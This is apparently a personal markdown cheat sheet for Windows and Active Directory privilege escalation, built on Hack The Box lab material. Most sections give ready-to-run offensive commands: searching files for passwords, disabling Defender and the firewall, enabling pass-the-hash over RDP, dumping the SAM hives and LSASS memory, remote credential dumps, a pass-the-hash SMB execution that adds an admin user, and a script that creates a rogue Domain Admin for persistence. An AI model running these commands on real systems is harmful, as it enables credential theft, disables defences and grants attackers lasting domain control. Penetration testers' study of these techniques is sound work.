# Windows Priv Esc

## Windows Privileges

| Privilege Level | Type   | Description                                                                                     |
|-----------------|--------|-------------------------------------------------------------------------------------------------|
| Guest User      | Local  | Provides initial entry to the PC with restricted access.                                        |
| Regular User    | Local  | Standard account permissions on a local machine.                                                |
| Admin           | Local  | Elevated account privileges within a local system environment.                                  |
| NT Authority    | Local  | The highest level of privilege on a local system, with comprehensive control.                   |
| Regular User    | Domain | Standard user in the domain, included in the 'Users' group with typical permissions.            |
| Delegated Admin | Domain | Enhanced administrative rights, with additional powers beyond a standard user.                  |
| Domain Admin    | Domain | Top-tier privileges across the domain, with the ability to manage domain-wide resources.        |
| Enterprise Admin| Domain | Full access to all resources across the entire organization, surpassing domain-specific limits. |


## WMIC enumeration

| Category            | Command                                           |
|---------------------|---------------------------------------------------|
| System Information  | `wmic computersystem list full`                   |
| BIOS Information    | `wmic bios get name,serialnumber,version`         |
| CPU Information     | `wmic cpu get name,CurrentClockSpeed,maxclockspeed,status` |
| Running Processes   | `wmic process list brief`                         |
| Memory Usage        | `wmic os get freephysicalmemory, totalvisiblememorysize`   |
| Disk Drives         | `wmic diskdrive get name,size,model`              |
| Logical Disks       | `wmic logicaldisk get name,freespace,size`        |
| Installed Software  | `wmic product get name,version`                   |
| Network Adapters    | `wmic nic get name, macaddress, speed`            |

| Startup Commands    | `wmic startup list full`                          |
| Environment Variables | `wmic environment list`                         |
| Services            | `wmic service list brief`                         |
| Hotfixes            | `wmic qfe get hotfixid`                           |


wmic to launch a process
`
wmic process call create "notepad.exe"
`

## Privs
```
Get-LocalUser
```
```
net user bob
```
```
whoami /priv
```

| User Accounts       | `wmic useraccount list brief`                     |

Check users of the domain AD

```
net user /domain
```

groups of user
```
whoami /groups
```
```
Get-LocalGroup
```

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/b5257988-299c-4118-9b0b-cdb1b558df1c)


### priv attacks

## Network enumeration

```
netstat -ano
```
powershell to get current domain name
```
(Get-WmiObject Win32_ComputerSystem).Domain
```



### Initial enumeration
System

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/8034c6d9-6158-4997-802e-73b109446aa4)




cmd to check hidden files

```
dir /A H
```

### cmd help
any command with /? will show help and options.

```
move /?
```
## Credential hunting code chunks

<img width="657" alt="Screen Shot 2022-08-06 at 2 44 39 PM" src="https://github.com/dbissell6/Shadow_Stone/assets/50979196/96928590-0c83-4281-bbf9-cd0e5c5be354">

```
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

``` 
dir secret.doc /s /p
```


## Find location of file using cmd.exe
```
where /R C:\ waldo.txt
```

## lazagne.exe
Search for creds 

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/967edbe2-5a31-463d-95cd-e9b7e722be06)





# Active Directory

## Snaffler 
Snaffler is a tool that can help us acquire credentials or other sensitive data in an Active Directory environment. 

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/96179d5a-2b09-4149-8540-927ba2e13e9c)


## ADCS

Active Directory Certificate Services 

Enumerate Certificate Services.

### Certipy

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/b15d4c16-febf-4eb7-84c6-b421259763c7)

request cert

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/8134c0a8-336c-483b-971e-0f358e418032)

authenticate to get tgt and hash

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/3ded7ca8-2b53-4c9c-9f1b-fcea0209cac1)

connect to dc with tgt

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/f91d6aab-eb38-4eb0-a753-247893272d7d)

could also use pth and evil-winrm

### NETEXEC

`https://github.com/Pennyw0rth/NetExec`

### Certify

`https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_x64/Certify.exe`

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/7df2b073-0a1e-40f2-8912-32ec671b9c3c)

## Anti-Virus 
Get status of AV

![Pasted image 20230508095011](https://github.com/dbissell6/Shadow_Stone/assets/50979196/deb17c10-cb12-4381-8f96-040497f65966)

### Applocker 
Windows way to whitelist acceptable apps to run

```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

### See if Powershell is constrained

![Pasted image 20230508095505](https://github.com/dbissell6/Shadow_Stone/assets/50979196/61ec3ded-a452-4e9e-861d-856682505547)

## Making changes to AV

Turn off AV - need admin
`Set-MpPreference -DisableRealtimeMonitoring $true`

Turn off Real-time
```
Set-MpPreference -DisableIOAVProtection $true
```

Turn off firewalls

```
netsh advfirewall set allprofiles state off
```

<img width="783" alt="Screen Shot 2022-10-10 at 2 15 20 PM" src="https://github.com/dbissell6/Shadow_Stone/assets/50979196/38ce0352-57e2-4ccb-a68a-bbb6e49eb5ed">

## Temporary bypass
You can bypass the execution policy for the current PowerShell session by running the following command:

```
Set-ExecutionPolicy Bypass -Scope Process
```


![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/edf912cb-ea5f-4efc-b2c1-0b84f79aa9a4)


To allow Pass-the-Hash (PTH) attacks over Remote Desktop Protocol (RDP) and disable Restricted Admin mode, you need to set the following registry value to 0
```
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value 0

```

.ps1 to find hosts in a network
```
$subnet = "172.16.9" # The first three octets of the subnet
$lastOctetRange = 1..254

foreach ($octet in $lastOctetRange) {
    $ipAddress = "$subnet.$octet"
    $result = Test-Connection -ComputerName $ipAddress -Count 1 -ErrorAction SilentlyContinue
    if ($result -ne $null) {
        Write-Host "$ipAddress is online."
    }
}
```

powershell to enumerate open ports of a host 
```
`1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.129.25.115",$_)) "Port $_ is open!"} 2>$null`
```

### Service Binary Hijacking

Each Windows service is associated with a binary file that gets executed when the service is started or enters a running state. In this context, let's consider a situation where a software developer creates a program and installs it as a Windows service. During the installation process, the developer fails to secure the program's permissions properly, granting full Read and Write access to all members of the Users group. Consequently, a user with lower privileges could replace the program with a malicious one.

To run the replaced binary, the user can either restart the service or, if the service is configured to start automatically, simply reboot the machine. Once the service restarts, the malicious binary will be executed with the service's privileges, such as LocalSystem.


```
When using a network logon such as WinRM or a bind shell, Get-CimInstance
and Get-Service will result in a “permission denied” error when querying for
services with a non-administrative user. Using an interactive logon such as RDP
solves this problem.
```


```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

## Access Control Lists(ACLS)

BloodHound is also really useful.
### Enumeration with native tools

```
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
```
```
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
```

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/a252cab8-daa9-47e1-a7d6-623336f71944)


```
$guid= "00299570-246d-11d0-a768-00aa006e0529"
```

```
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
```

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/a70b572a-10db-436b-b3df-15743139174e)

### Enumeration with PowerView

```
Import-Module .\PowerView.ps1;
$sid = Convert-NameToSid wley
```

```
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/dfc99669-2082-4244-8950-10b61f4eb71e)

We can see the user we have pwnd has the ablity to change the password for CN=Dana Amundsen


### Abuse

Create the password and cred object for our user, create a new password for the damunden user and run the PowerView script.

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/a5ae4e6b-b57a-4564-933b-d30b39868c46)

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/89f0888b-ac63-499d-a51a-2cc827a5e005)



## Bloodhound

To Run bloodhound. Upload and run sharphound to the victim.

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/00c27b7f-51ca-49bd-9ec2-db1c5c8887b2)

Download zipfile to attack machine. Start neo4j.

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/8f08ccad-6198-4250-b2fd-baacef6d37b4)

Start Bloodhound. Login

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/373b653d-01df-4491-942b-98dad01b9f2a)

On right side of screen, upload data, select zip file.

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/5b2b0c34-e3d0-47bd-9417-93f34e58df93)




## GPOs

A Group Policy Object (GPO) is a set of policy settings used for configuration management in Active Directory. GPOs contain various policy settings and are linked to specific Organizational Units (OUs) within Active Directory. They can be restricted to apply only to certain objects or conditions.

Initially, only privileged roles like Domain Admins can modify GPOs. However, in some cases, less privileged accounts are granted edit permissions. This can pose a security risk as compromised users could then modify GPOs. Attackers could add malicious scripts or tasks, potentially compromising all computer objects in the linked OUs.

Additionally, GPOs are used for software installation and configuring startup scripts from network shares. Misconfigured network shares may allow adversaries to replace files with malicious ones, even if the GPO itself is properly configured.

List with powershell + wmi 
```
$GPOs = Get-WmiObject -Namespace "Root\RSOP\Computer" -Query "Select * From RSOP_GPO" | Select DisplayName, Name
$GPOs
```
![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/2f60845d-b52b-4b26-bb64-e16334e27c18)


## Scheduled Tasks
```
Get-ScheduledTask
```
```
schtasks /query
```
## Process search

```
Get-Process
```
```
Get-Service
```
powershell code
```
Get-NetTCPConnection | Select-Object -Property *,@{'Name' = 'ProcessName';'Expression'={(Get-Process -Id $_.OwningProcess).Name}}
```
<img width="569" alt="Screen Shot 2022-08-05 at 5 23 55 PM" src="https://github.com/dbissell6/Shadow_Stone/assets/50979196/9db828d4-b9dd-4a77-a096-56761e7380b9">


## Moving between Users



## Move between 



## Attacking SAM

The Windows Security Account Manager (SAM) database is a critical component of the Windows operating system that stores user account information and password hashes. It plays a crucial role in authentication and authorization processes on a Windows-based system. Here's a breakdown of how the Windows SAM database works:

1) User Account Information Storage: The SAM database stores essential information about user accounts, such as usernames, user IDs (SIDs - Security Identifiers), account status (active or disabled), and password hashes.

2)  Password Hashes: Instead of storing passwords in plaintext, the SAM database stores password hashes. A password hash is a one-way cryptographic representation of the user's password. When a user creates or changes their password, the system generates a hash of the password and stores it in the SAM database. This way, the actual passwords are not directly accessible, enhancing security.

3)  Hashing Algorithm: Windows operating systems use various hashing algorithms over the years. Historically, they used LM (LAN Manager) and NTLM (NT LAN Manager) hash algorithms, which are now considered weak. In modern versions of Windows, such as Windows 10 and Windows Server 2016 and later, more secure algorithms like NTLMv2 and Kerberos are used.

4)  Access Control: The SAM database is protected to ensure its integrity and confidentiality. Only privileged system processes and administrators with the appropriate permissions can access the SAM database directly. Access to this file is heavily restricted to prevent unauthorized access and tampering.

5)  User Authentication: When a user attempts to log in to a Windows system, the system verifies their credentials by checking the provided password against the stored hash in the SAM database. If the hashes match, the authentication is successful, and the user gains access to the system.

6)  Offline Attacks: While the SAM database is protected on a running system, an attacker with physical access to the machine might attempt to extract the SAM database files and perform "offline" attacks. In such attacks, the attacker can use specialized tools to crack the password hashes without interacting with the live system.

7) LSA Secrets: Besides user account information, the SAM database also stores Local Security Authority (LSA) secrets. These secrets can include sensitive data, such as service account passwords or auto-logon credentials. Access to LSA secrets is also restricted and requires administrative privileges.

It's important to note that Windows has been evolving over time, and its security mechanisms have improved. For instance, modern Windows versions use the more secure Active Directory (AD) system for managing user accounts and authentication in a networked environment, which stores user account information centrally and implements additional security measures.


### hklm\sam:

The hklm\sam refers to a specific hive in the Windows Registry, where the SAM database is stored. The Windows Registry is a centralized hierarchical database used by the Windows operating system to store configuration settings, options, and information about system components, user preferences, and installed software.

The SAM hive, short for Security Accounts Manager, is a key component of the Windows Registry that holds the local user account database and their respective password hashes. This database is used for authentication on a local Windows system. The SAM database is locked while the system is running to prevent unauthorized access, but with the right tools and privileges, it is possible to access the SAM hive.

The password hashes stored in the SAM database are one-way cryptographic representations of the user account passwords. They are generated using a hashing algorithm (e.g., NTLMv2 or Kerberos) and cannot be converted back into the original plaintext passwords easily. The goal of extracting the hashes from the SAM database is to attempt to crack them using specialized tools and techniques to reveal the original passwords.

### hklm\system:

The hklm\system refers to another hive in the Windows Registry that contains vital information about the Windows system, including device drivers, system configuration, and hardware settings.

Of particular interest for password cracking purposes, the hklm\system hive holds the System boot key. The System boot key is a cryptographic key that is used to encrypt sensitive information, including the SAM database's password hashes.

When Windows starts up, it uses the System boot key to decrypt the password hashes stored in the SAM database, allowing the system to perform user authentication. By obtaining the System boot key, an attacker gains access to the necessary information to decrypt the password hashes offline, even if the SAM database is not directly accessible on the running system.

For security reasons, the hklm\system hive is also protected, and access to it is restricted to privileged system processes and administrators with the appropriate permissions.

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/3db4b6f6-f994-49ef-bd40-d348532c0b7e)


```
 reg.exe save hklm\sam C:\sam.save; reg.exe save hklm\system C:\system.save; reg.exe save hklm\security C:\security.save
```


![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/1d1df6e9-cb75-4d82-92e7-4a5190dc60cf)

```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

Check cracking to see how to crack hashes, PTH tho?

Extract Hashes from SAM Database with admin creds

### Do the above remotely

```
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```
### LSA remote dump
```
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```
## Attack LSASS

The Windows Local Security Authority Subsystem Service (LSASS) is a critical component of the Windows operating system that handles various security-related functions, including user authentication, local security policy enforcement, and management of security tokens.

Here's an explanation of Windows LSASS and its functionalities:

1)  Process Description: LSASS is a system process that runs in the background of the Windows operating system. It operates as a protected system process, meaning it runs with elevated privileges and cannot be terminated by normal means.

2)  Authentication and Authorization: One of the primary functions of LSASS is user authentication. When a user attempts to log in to a Windows system, LSASS handles the authentication process. It verifies the user's credentials (username and password) against the password hashes stored in the SAM database (Security Account Manager), which we discussed earlier. If the authentication is successful, LSASS creates a security token for the user, which contains the user's security identifier (SID) and their associated security privileges.

3)  Security Token Management: LSASS is responsible for managing security tokens. These tokens are created for users during logon and contain the user's identity, group memberships, and security privileges. The tokens are then used to grant or deny access to various system resources based on the user's permissions.

4)  Enforcement of Security Policies: LSASS enforces local security policies on the system. These policies define various security settings, such as password complexity requirements, account lockout policies, and user rights assignments. LSASS ensures that these policies are applied and followed when users log in and access system resources.

5)  Lsass.exe Process: The LSASS service is represented by the lsass.exe process in Task Manager. As a critical system process, it is essential to protect it from unauthorized access and tampering. Malware or attackers may attempt to target LSASS for privilege escalation or credential theft, making it a high-value target for security.

6)  Handling LSA Secrets: In addition to user authentication and security token management, LSASS also deals with Local Security Authority (LSA) secrets. LSA secrets are sensitive data, such as service account passwords, auto-logon credentials, and other encrypted information used by the system. LSASS securely stores and manages these secrets, ensuring they are accessible only by authorized processes and services.


### Dump with task manager

Right click on 'Local Security Authority Process'
![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/b17ce34e-871f-4d46-8e4a-00ee00dd4e72)

### Dump with Powershell
```
PS C:\Windows\System32> ./rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 672 C:\lsass.dmp full
```
### pypykatz to extract creds
![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/73175859-68c8-4c57-b017-179492da0fdb)



### Create user with .exe

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/0b82cb14-8c8a-4002-8676-3885a8cb9062)

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/8dd0966b-f566-409c-98d3-f17f840d9358)

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/7ec65850-6bd5-4b23-aa62-62fdc4457f0d)

## Coercing Attacks & Unconstrained Delegation

Coercion-based attacks serve as a comprehensive method for elevating privileges, enabling the transition from any user to a Domain Administrator. Virtually all organizations employing a default Active Directory (AD) setup are susceptible to these attacks. Any user within the domain can compel the RemoteServer$ account to initiate authentication with any machine in the domain. Subsequently, the Coercer tool was created to exploit all identified vulnerable RPC functions concurrently.

Powerview to see Unconstrained

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/b42f1114-e503-46bb-9f4d-c9e1a0d828d2)


Start Rubeus

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/cf2ed240-ead9-43cf-9a63-7aa25cab5dc8)


Connect with coercer

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/c356a0aa-8d99-4bcd-979a-789f44dc2e4d)


Get TGT on Rubeus

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/0682498b-8556-4319-9dd5-7f188a1dfc9e)

DCSync with ticket / explaination below

Rubeus to import ticket

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/bd8042ee-6ef9-4cf3-a8b4-f14447788ca0)

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/bc902410-41ff-41ed-839d-89eea6866f2f)


Mimikatz to dump hash

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/ab00cee6-f000-4db7-959b-efbc86df642a)


Connect as DC1/Administrator

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/1ca5cc60-392b-4b75-b67d-7a448c043962)


### DCSync
DCSync is a method used to extract the password database of Active Directory. It works by exploiting the Directory Replication Service Remote Protocol, which is employed by Domain Controllers to synchronize domain data. In essence, it enables an attacker to impersonate a Domain Controller and obtain user NTLM password hashes.

The core of this attack involves requesting a Domain Controller to replicate passwords through the DS-Replication-Get-Changes-All extended right. This right is a specific access control privilege in Active Directory that allows for the replication of confidential data.

To execute this attack, the attacker needs control over an account with the necessary permissions for domain replication, namely, a user account with the Replicating Directory Changes and Replicating Directory Changes All permissions enabled.



### Delete users
Local
```
# Replace "UserToDelete" with the username of the user you want to delete.
$UserToDelete = "UserToDelete"
Remove-LocalUser -Name $UserToDelete
```
AD
```
# Replace "UserToDelete" with the username of the user you want to delete.
$UserToDelete = "UserToDelete"
Remove-ADUser -Identity $UserToDelete -Confirm:$false

```
### PTH from inside windows

### Invoke the Hash smb

Create a new user and login
```
Import-Module .\Invoke-TheHash.psd1
```
```
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```
```
Enter-PSSession -ComputerName 172.16.1.10 -Credential inlanefreight.htb\mark
```

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/aebb2d7f-6f6b-493b-b01b-0de102e2729e)




## pass the ticket from in windows
https://academy.hackthebox.com/module/147/section/1639

## just got admin on local

### Inveigh
Like responder.

![Pasted image 20230508074627](https://github.com/dbissell6/Shadow_Stone/assets/50979196/2ee76561-6c3a-4941-a859-0212c76bd8aa)

![Pasted image 20230508074732](https://github.com/dbissell6/Shadow_Stone/assets/50979196/e51ce110-da44-4b04-aa14-5183bb46827f)


## I just got admin on the dc

Find computers
```
Get-ADComputer -Filter {OperatingSystem -like "*Windows Server*"}
```

# Creating persistence

## dll highjacking

## startup

will only run when user connects with graphical interface like rpd(wont work if winrm), will not run .ps1 files, only bats or exe.

`C:\Users\blwasp\appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`

## registry

## get admin of DC create another admin user with powershell and active directory

```
Import-Module ActiveDirectory

$NewUserParams = @{
    SamAccountName = "ViviG"   # Replace with desired username
    UserPrincipalName = "VIVIG@INLANEFREIGHT.LOCAL"   # Replace with desired UPN
    Name = "VivisGhost"          # Replace with desired display name
    GivenName = "Vivis"                # Replace with desired first name
    Surname = "Ghost"                # Replace with desired last name
    AccountPassword = (ConvertTo-SecureString "VIVIG123" -AsPlainText -Force)   # Replace with desired password
    Enabled = $true
}

New-ADUser @NewUserParams
Add-ADGroupMember -Identity "Domain Admins" -Members "ViviG"
```



https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
